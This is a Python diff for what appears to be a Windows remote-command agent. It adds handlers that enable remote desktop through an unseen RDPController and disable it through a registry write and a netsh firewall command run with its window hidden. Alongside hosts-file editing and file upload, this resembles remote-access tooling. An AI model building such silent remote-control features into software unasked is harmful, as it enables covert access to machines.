@@ -27,7 +27,9 @@ class CommandHandler:
             'edit_hosts': CommandHandler.handle_edit_hosts,
             'open_url': CommandHandler.handle_open_url,
             'upload_file': CommandHandler.handle_upload_file,
-            'end_task': CommandHandler.handle_end_task
+            'end_task': CommandHandler.handle_end_task,
+            'enable_rdp': CommandHandler.handle_enable_rdp,
+            'disable_rdp': CommandHandler.handle_disable_rdp
         }
         
         handler = handlers.get(command_type)
@@ -410,3 +412,39 @@ class CommandHandler:
             if Config.DEBUG_MODE:
                 logging.error(f"File upload failed: {str(e)}")
             raise CommandError(f"File upload failed: {str(e)}")
+
+    @staticmethod
+    def handle_enable_rdp(params):
+        try:
+            from monitoring.rdp_controller import RDPController
+            from encryption.manager import EncryptionManager
+            from config import Config
+
+            rdp_controller = RDPController(EncryptionManager(Config.ENCRYPTION_KEY))
+            if rdp_controller.start():
+                logging.info("RDP enabled and configured successfully")
+                return {"status": "success", "message": "RDP enabled and configured"}
+            else:
+                logging.error("Failed to enable and configure RDP")
+                raise CommandError("Failed to enable and configure RDP")
+        except Exception as e:
+            logging.error(f"Enable RDP error: {str(e)}")
+            raise CommandError(f"Enable RDP error: {str(e)}")
+
+    @staticmethod
+    def handle_disable_rdp(params):
+        try:
+            # غیرفعال‌سازی RDP از طریق رجیستری
+            key_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:
+                winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)
+
+            # غیرفعال‌سازی Remote Desktop در فایروال
+            cmd = 'netsh advfirewall firewall set rule group="remote desktop" new enable=No'
+            subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+
+            logging.info("RDP disabled successfully")
+            return {"status": "success", "message": "RDP disabled"}
+        except Exception as e:
+            logging.error(f"Disable RDP error: {str(e)}")
+            raise CommandError(f"Disable RDP error: {str(e)}")
